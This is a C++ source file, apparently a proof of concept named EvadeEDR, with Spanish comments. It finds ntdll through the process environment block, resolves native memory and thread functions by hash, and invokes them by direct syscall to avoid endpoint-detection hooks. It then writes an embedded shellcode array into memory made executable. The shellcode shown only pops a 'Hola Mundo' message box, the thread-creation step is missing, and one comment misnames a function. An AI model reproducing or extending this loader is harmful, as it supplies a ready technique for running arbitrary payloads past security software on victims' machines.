// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

#include "DefsModule.h"

extern "C" void __fastcall SetCall(WORD CallValue);

extern "C" NTSTATUS __fastcall CallFunc(...);


#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)

// Struct
typedef struct _FUNC_VAL
{
    ULONG magic_number;
    WORD call_number;
} FUNC_VAL, * PFUNC_VAL;


// Environment
PTEB GetEnvironmentThreadBlock()
{
    return (PTEB)__readgsqword(0x30);
}


// Calculate the dbj2 to get function
unsigned int Calculacion(const char* str) {
    unsigned int hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}

// Get the function from the DLL Base
BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PFUNC_VAL value) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (Calculacion(FunctionName) == value->magic_number)
        {
            print("[+] Funcion encontrada: %s", FunctionName);


            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    value->call_number = (high << 8) | low;
                    break;
                }

                cw++;
            }

            print("[+] El Syscall: %d", value->call_number);

            return TRUE;
        }
    }

    return FALSE;
}


// Get the image
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {


    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}


PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}



// Entry Point
int main()
{

    PTEB pCurrentTeb = GetEnvironmentThreadBlock();

    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

    if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
    {
        print("[-] Error On getting TEB and PEB");
        return -1;
    }

    print("[+] Replicando chido");

    // Get Ntddl module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
    {
        print("[-] No se obtuvo Modulo de NTDLL");
        return -1;
    }

    print("[+] Se obtuvo modulo de NTDLL");


    //
    //  Functions to export
    //
    FUNC_VAL firstFunction = { 0 };
    FUNC_VAL secondFunction = { 0 };
    FUNC_VAL thirdFunction = { 0 };

    // NtAllocateVirtualMemory
    firstFunction.magic_number = 0x6793c34c;

    // NtProtectVirtualMemory
    secondFunction.magic_number = 0x82962c8;

    // NtFreeVirtualMemory
    //thirdFunction.magic_number = 0x471aa7e9;

    // NtCreateThreadEx 
    thirdFunction.magic_number = 0x376e0713;

    // Get NtAllocateVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);

    // Get NtProtectVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);

    // Get NtFreeVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);

    //
    //  Start process
    //

    // For the status
    NTSTATUS status = 0;

    // Payload
    BYTE payload[] = {
        0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48,
        0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x33, 0xc0, 0xc7, 0x45, 0xd0, 0x75,
        0x73, 0x65, 0x72, 0x48, 0x8d, 0x0d, 0xf6, 0x0f, 0x00, 0x00, 0x88, 0x45,
        0xda, 0x88, 0x45, 0xea, 0xc7, 0x45, 0xd4, 0x33, 0x32, 0x2e, 0x64, 0x66,
        0xc7, 0x45, 0xd8, 0x6c, 0x6c, 0xc7, 0x45, 0xf0, 0x4d, 0x65, 0x73, 0x73,
        0xc7, 0x45, 0xf4, 0x61, 0x67, 0x65, 0x42, 0xc7, 0x45, 0xf8, 0x6f, 0x78,
        0x41, 0x00, 0xc7, 0x45, 0xc0, 0x53, 0x68, 0x65, 0x6c, 0xc7, 0x45, 0xc4,
        0x6c, 0x63, 0x6f, 0x64, 0x66, 0xc7, 0x45, 0xc8, 0x65, 0x00, 0xc7, 0x45,
        0xe0, 0x48, 0x6f, 0x6c, 0x61, 0xc7, 0x45, 0xe4, 0x20, 0x4d, 0x75, 0x6e,
        0x66, 0xc7, 0x45, 0xe8, 0x64, 0x6f, 0xff, 0x15, 0x90, 0x0f, 0x00, 0x00,
        0x48, 0x8b, 0xc8, 0x48, 0x8d, 0x15, 0xa6, 0x0f, 0x00, 0x00, 0x48, 0x8b,
        0xd8, 0xff, 0x15, 0x75, 0x0f, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xa6, 0x0f,
        0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0xf8, 0xff, 0x15, 0x62, 0x0f,
        0x00, 0x00, 0x48, 0x8d, 0x4d, 0xd0, 0x48, 0x8b, 0xd8, 0xff, 0xd7, 0x48,
        0x8d, 0x55, 0xf0, 0x48, 0x8b, 0xc8, 0xff, 0xd3, 0x45, 0x33, 0xc9, 0x4c,
        0x8d, 0x45, 0xc0, 0x48, 0x8d, 0x55, 0xe0, 0x33, 0xc9, 0xff, 0xd0, 0x48,
        0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4,
        0x60, 0x5d, 0xc3
    };

    //
    //  Values for the memory allocation
    //
    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    //
    //  Start With the read write memory allocation
    //
    print("[*] Asignando memoria RW...");
    SetCall(firstFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0)
    {
        print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
        return -1;
    }

    if (!pAddr)
    {
        print("[-] No se obtuvo memoria");
    }

    print("[+] Memoria asignada en: 0x%p", pAddr);
    print("[+] Size: %zu bytes", payload_size);


    //
    //  Read Write Memory
    //
    print("[*] Copiando payload...");
    CopyMem(pAddr, (PVOID)payload, real_size);
    print("[+] Payload copiado");


    //
    //  Changing permissions from the memory region
    //
    print("[*] Cambiando permisos a RX...");
    SetCall(secondFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &payload_size, PAGE_EXECUTE_READ, &ulOldProtect);

    if (status != 0)
    {
        print("[-] Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    print("[+] Permisos cambiados exitosamente");


    //
    //  Create Thread
    //
    print("[*] Creando hilo");
    

    /*  Well here's missing the NtCreateThread Function*/

    SetCall(thirdFunction.call_number); // The syscall value

    //
    // Free memory
    //

    /*SIZE_T free_size = 0;

    print("[*] Liberando memoria...");
    SetCall(thirdFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0)
    {
        print("[-] Error en NtFreeVirtualMemory: 0x%08X", status);
        return -1;
    }

    print("[+] Memoria liberada %lld", free_size);
    print("[+] Programa finalizado correctamente");*/
}
